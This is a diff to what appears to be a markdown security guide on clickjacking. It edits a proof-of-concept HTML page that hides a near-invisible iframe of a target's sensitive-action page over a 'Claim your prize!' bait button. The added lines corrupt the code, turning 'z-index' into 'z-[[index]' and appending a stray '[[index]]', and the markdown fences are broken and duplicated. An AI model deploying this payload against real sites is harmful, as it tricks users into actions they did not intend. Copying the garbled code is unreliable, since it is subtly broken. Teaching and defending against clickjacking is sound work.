@@ -27,7 +27,7 @@
 ---
 
 ### 🧪 2. Basic Clickjacking PoC
-`<!DOCTYPE html> <html> <head>   <title>Clickjacking PoC</title>   <style>     iframe {       position: absolute;       top: 0;       left: 0;       width: 1000px;       height: 1000px;       opacity: 0.01; /* Invisible */       z-index: 2;     }     .bait {       z-index: 1;       position: absolute;       top: 100px;       left: 100px;     }   </style> </head> <body>   *"<button class="bait">Claim your prize!</button>"*   ```html
+`<!DOCTYPE html> <html> <head>   <title>Clickjacking PoC</title>   <style>     iframe {       position: absolute;       top: 0;       left: 0;       width: 1000px;       height: 1000px;       opacity: 0.01; /* Invisible */       z-index: 2;     }     .bait {       z-[[index]: 1;       position: absolute;       top: 100px;       left: 100px;     }   </style> </head> <body>   <button class="bait">Claim your prize!</button>   ```html
 ```html
 ```html
 <iframe src="https://target.com/sensitive-action"></iframe>
@@ -153,3 +153,6 @@ Look for:
 | Browser-level | sandboxed iframe                    | Yes (with trade-offs) |
 
 ---
+
+
+[[index]]
